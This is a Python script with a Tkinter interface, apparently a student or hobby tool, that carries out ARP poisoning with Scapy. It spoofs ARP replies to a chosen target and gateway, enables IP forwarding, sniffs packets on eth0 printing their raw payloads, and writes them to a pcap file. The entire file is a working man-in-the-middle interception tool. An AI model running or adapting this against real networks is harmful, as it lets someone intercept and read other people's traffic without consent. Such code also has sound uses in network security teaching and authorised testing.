# -*- coding: utf-8 -*-

#############################
# Title - Arp Poisonning
# Date - 06/09/2017
# Author - Rémi LIQUETE
#############################

# Global flag
running = True
GoButtonClicked = False

############ FUNCTION ################
# Get mac address function
def get_mac(IP):
	ans, unans = arping(IP)
	for s, r in ans:
		return r[Ether].src

# ARP poisonning function
def arp_poison(routerIP, victimIP):
	victimMAC = get_mac(victimIP)
	routerMAC = get_mac(routerIP)
	send(ARP(op =2, pdst = victimIP, psrc = routerIP, hwdst = victimMAC))
	send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = routerMAC))

# Back to default function
def back_default(routerIP, victimIP):
    victimMAC = get_mac(victimIP)
    routerMAC = get_mac(routerIP)
    send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 4) 
    send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 4)

# Sniffing function
def sniffer():
    pkts = sniff(iface = "eth0", count = 10, prn=lambda x:x.sprintf(" Source: %IP.src% : %Ether.src%, \n %Raw.load% \n\n Reciever: %IP.dst% \n +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n"))
    wrpcap("temp.pcap", pkts)

# Attack function
def BOUM():
	while(running and GoButtonClicked):
		arp_poison(varGateway.get(), varTarget.get())
		time.sleep(1)
		sniffer()

# Go button function
def GO():
	global GoButtonClicked 
	GoButtonClicked = True
	global running 
	running = True
	print("Process running ...")
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
	thread = threading.Thread(target=BOUM)
	thread.start()

# Stop button function
def STOP():
	global running
	running = False
	back_default(varGateway.get(), varTarget.get())
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
	sys.exit(1)

############ BODY ####################

import tkinter
import threading
from scapy.all import *

# Fenêtre principale
mainWindow = tkinter.Tk()
mainWindow.title("Arp Poisonning")

mainFrame = tkinter.Frame(mainWindow, width=800, height=800, borderwidth=1)
mainFrame.pack(fill='both')

# Menu bar
menuBar = tkinter.Menu(mainWindow)

menuFile = tkinter.Menu(menuBar, tearoff=0)
menuFile.add_command(label="Quit", command=mainWindow.quit)

menuBar.add_cascade(label="Fichier", menu=menuFile)

mainWindow.config(menu=menuBar)

# Target Side
targetFrame = tkinter.Frame(mainFrame, width=300, height=300, borderwidth=1)
targetFrame.pack(side="left", fill='y')

labelTarget = tkinter.Label(targetFrame, text="Target IP")
labelTarget.pack(side="left", fill='y')

varTarget = tkinter.StringVar()
targetEntry = tkinter.Entry(targetFrame, textvariable=varTarget, width=30)
targetEntry.pack(side="right", fill='y')

# Gateway side
gatewayFrame = tkinter.Frame(mainFrame, width=300, height=300, borderwidth=1)
gatewayFrame.pack(side="right", fill='y')

labelGateway = tkinter.Label(gatewayFrame, text="Gateway IP")
labelGateway.pack(side="left", fill='y')

varGateway = tkinter.StringVar()
#varGateway = "10.94.73.254"
gatewayEntry = tkinter.Entry(gatewayFrame, textvariable=varGateway, width=30)
gatewayEntry.pack(side="right", fill='y')

# Buttons
butonGO = tkinter.Button(mainFrame, text="GO !", command=GO)
butonGO.pack(side="bottom", fill="none")

buttonStop = tkinter.Button(mainFrame, text="Stop", command=STOP)
buttonStop.pack(side="bottom", fill="none")

mainWindow.mainloop()
